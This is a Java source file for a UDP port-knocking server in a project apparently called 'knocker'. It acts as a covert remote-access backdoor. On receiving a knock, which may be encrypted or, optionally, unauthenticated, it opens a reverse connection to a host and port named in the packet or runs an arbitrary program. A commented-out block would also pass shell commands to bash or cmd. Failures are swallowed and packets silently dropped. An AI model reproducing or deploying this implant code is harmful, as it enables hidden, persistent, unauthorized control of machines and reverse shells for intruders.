package knocker.server;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;

import knocker.lib.io.Base64;
import knocker.lib.security.AES;

public class Server {
	
	/*
		0b01000000 = 0x40 = '@'
		0b01000001 = 0x41 = 'A'
		0b01000010 = 0x42 = 'B'
		0b01000011 = 0x43 = 'C'
		0b01000100 = 0x44 = 'D'
		0b01000101 = 0x45 = 'E'
		0b01000110 = 0x46 = 'F'
		0b01000111 = 0x47 = 'G'
		0b01001000 = 0x48 = 'H'
	*/
	
	private final static char FALSE = '@'; // 0b01000000 = 0x40 = '@'
	private final static char TRUE = 'A'; // 0b01000001 = 0x41 = 'A'
	
	//public final static int OP_OPEN_FW = 'A'; // 0b01000001 = 0x41 = 'A'
	private final static char OP_REVERSE = 'B'; // 0b01000010 = 0x42 = 'B'
	private final static char OP_EXECUTE = 'D'; // 0b01000100 = 0x44 = 'D'
	//private final static char OP_COMMAND = 'H'; // 0b01001000 = 0x48 = 'H'
	
	/**
	 * By default encryption and authentication is required.
	 * If set to false encryption and authentication become optional.
	 * If set to true encryption and authentication is required for a knock to be accepted.
	**/
	private static boolean encryptionRequired = true;
	
	/**
	 * A wrapper method to allow some flexibility when an issue happens.
	 * @param s A message to report.
	**/
	private static void log(String s) {
		System.out.println(s);
	}
	
	/**
	 * 
	 * @param s The String to convert to an integer
	 * @return An integer between 0 and 0xFFFF or -1 if the String is not a valid port number
	**/
	private static int portFrom(String s) {
		try {
			int v = Integer.parseInt(s.trim());
			if (v > 0 && v < 0xFFFF) {
				return v;
			}
		} catch (NumberFormatException e) {
			// Swallow
		}
		return -1;
	}
	
	/**
	 * This method should only be called for a valid and checked knock.
	 * This method performs the action requested by the knock.
	 * @param data The buffer containing the knock
	 * @param start The offset in the buffer to start reading from
	 * @param length The length of the knock packet
	 * @param inetAddress The address to connect back to. Only used if a reverse connection
	 * is requested but no rhost or rport is specified.
	 * @throws IOException
	**/
	private static void process(byte[] data, int start, int length, InetAddress inetAddress) throws IOException {
		byte op = data[start];
		String str = new String(data, start + 1, length - 1);
		if (op == OP_REVERSE) {
			if (str == null || str.length() < 1) {
				// Silently drop
				return;
			}
			int idx = str.lastIndexOf(":");
			if (idx > -1) {
				String a = str.substring(0, idx);
				String p = str.substring(idx + 1);
				int port = portFrom(p);
				if (port > -1) {
					System.out.println("Attempting to reverse connect to " + a + ":" + port);
					Reverse.connect(InetAddress.getByName(a), port);
				} else {
					// The Knocker has failed to provide a port to connect to
					// Silently drop
					System.out.println("Bad port " + p + " in knock.");
				}
			} else {
				int port = portFrom(str);
				if (port > -1) {
					System.out.println("Attempting to reverse connect to " + inetAddress.toString() + ":" + port);
					Reverse.connect(inetAddress, port);
				} else {
					// The Knocker has failed to provide a valid port to connect to
					// Silently drop
					System.out.println("Bad port " + str + " in knock.");
				}
			}
		} else if (op == OP_EXECUTE) {
			try {
				new ProcessBuilder(str).start();
			} catch (Exception e) {
				// Swallow
			}
		/*} else if (op == OP_COMMAND) {
			String c = new String(data, start + 1, length).replace("\0", "").trim();

			try {
				if (System.getProperty("os.name").toLowerCase().contains("win")) {
					new ProcessBuilder("cmd", "/c", c).start();
				} else {
					new ProcessBuilder(Reverse.test("bash") ? "bash" : "sh", "-c", c).start();
				}
			} catch (Exception e) {
				// Swallow
			}*/
		} else {
			// The Knocker has requested an unsupported operation
			// Silently drop
		}
	}
	
	/**
	 * Checks and handles a DatagramPacket for a valid knock.
	 * @param p A DatagramPacket to check for a valid knock.
	**/
	private static void handle(DatagramPacket p) {
		byte[] bytes = p.getData();
		
		try {
			if (bytes[0] == TRUE) {
				byte[] part = new byte[p.getLength() - 1];
				System.arraycopy(bytes, 1, part, 0, part.length);
				ByteArrayInputStream bis = new ByteArrayInputStream(Base64.decode(part));
				DataInputStream dis = new DataInputStream(bis);
				
				byte[] encrypted_aes_key = new byte[dis.readShort()];
				dis.readFully(encrypted_aes_key);
				byte[] aes_key = Decryptor.tryDecrypt(encrypted_aes_key);
				
				if (aes_key != null) {
					byte[] rsa_encrypted_body = new byte[dis.readShort()];
					dis.readFully(rsa_encrypted_body);
					byte[] body = AES.decrypt(aes_key, rsa_encrypted_body);
					process(body, 0, body.length, p.getAddress());
				} else {
					// Silently drop
					System.out.println("Knock encrypted with invalid or unknown RSA key.");
				}
			} else if (encryptionRequired == false && bytes[0] == FALSE) {
				process(bytes, 1, p.getLength() - 1, p.getAddress());
			} else {
				// Silently drop
			}
		} catch (Exception e) {
			e.printStackTrace();
			// Silently drop
		}
	}
	
	/**
	 * Initializes a DatagramSocket and begins listening for knocks.
	 * @param port The port to bind to
	 * @param encryptionRequired If true the server will not handle or respond
	 * to un-authenticated knocks.
	 * @throws SocketException
	**/
	public static void init(int port, boolean encryptionRequired) throws SocketException {
		Server.encryptionRequired = encryptionRequired;
		DatagramSocket socket = new DatagramSocket(port);
		byte[] buffer = new byte[0x7FFF];
		DatagramPacket packet = new DatagramPacket(buffer, buffer.length);
		
		System.out.println("Listening for knocks on UDP port " + port);
		
		while (true) {
			try {
				socket.receive(packet);
				handle(packet);
			} catch (IOException e) {
				log(e.getMessage());
				break;
			}
		}
		socket.close();
	}
}
